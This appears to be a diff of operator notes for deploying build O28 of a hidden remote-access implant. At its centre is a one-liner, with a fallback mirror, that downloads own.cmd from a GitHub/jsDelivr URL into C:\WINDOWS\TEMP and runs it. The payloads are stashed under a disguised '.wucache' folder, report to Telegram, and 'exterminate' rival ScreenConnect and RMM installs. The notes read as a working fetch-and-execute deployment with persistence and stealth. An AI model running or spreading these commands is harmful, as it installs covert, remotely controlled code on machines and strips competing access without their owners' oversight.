@@ -1,27 +1,26 @@
-UNIVERSAL DEPLOY  (O27: T10 build-visibility + M17 alt-missing heal + L6 identity
-fix + exterminate + repair ladders + S6 hardening). Works on fresh AND stuck
-machines (old +h+s copies are attribute-stripped first):
+UNIVERSAL DEPLOY  (O28: identity loader %%L fix + L7 correct WOW hive + hardened
+exterminate that actually uninstalls 32-bit SC products + force dir nuke +
+M18 + T10 build visibility). THE ONLY COMMAND TO KEEP:
 
-  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o27" && call C:\WINDOWS\TEMP\own.cmd
+  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o28" && call C:\WINDOWS\TEMP\own.cmd
 
-Rescue (if raw is blocked on that box):
+Rescue:
 
-  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L -o C:\WINDOWS\TEMP\own.cmd "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own.txt?t=o27" && call C:\WINDOWS\TEMP\own.cmd
+  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L -o C:\WINDOWS\TEMP\own.cmd "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own.txt?t=o28" && call C:\WINDOWS\TEMP\own.cmd
 
-!! DELETE any older saved one-liners (t=o18..o26). The midnight wave proved old
-commands still circulate - every old build re-arms OLD bugs. Reports now show
-"Payload builds: MON=.. SEC=.. TGR=.. LIB=.." + "Source build: O27" so stragglers
-are instantly visible.
+Expect in TG after ~3-4 min:
+  Source build: O28
+  Payload builds: MON=M18 | SEC=S6 | TGR=T10 | LIB=L7
+  identity_A=\Microsoft\Windows\...   (REAL path, NEVER %V)
+  exterminate_engine_L7_begin
+  hive_scan ...WOW6432Node\Microsoft\Windows\...
+  product_msiexec [ScreenConnect Client (FOREIGN)] exit=0
+  dir_removed ...
+  exterminate svc=N proc=N dir=N product=N rmm=N fail=0
+  Foreign SC folders left: 0
 
-Wait ~3-4 min, then Telegram shows FIRST DEPLOY with ground truth:
-exterminate_begin/result, identity_A..D picks, create_task + verify, msi exits,
-payload builds line.
-
-Verify on-machine:
-  findstr /C:"BUILD" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_mon.cmd" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\tg_report.ps1" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_secure.cmd"
-  (expect: M17 / L6 / T10 / S6)
+On-machine verify:
+  findstr /C:"BUILD" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_mon.cmd" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\tg_report.ps1"
+  (expect M18 / L7 / T10)
   type "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\exterminate.log"
   type "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\identity.cfg"
-
-Fresh box = full arm. Existing box = payloads refreshed, identity regenerated,
-exterminate runs, ALT restored by GUID repair, builds visible in TG.
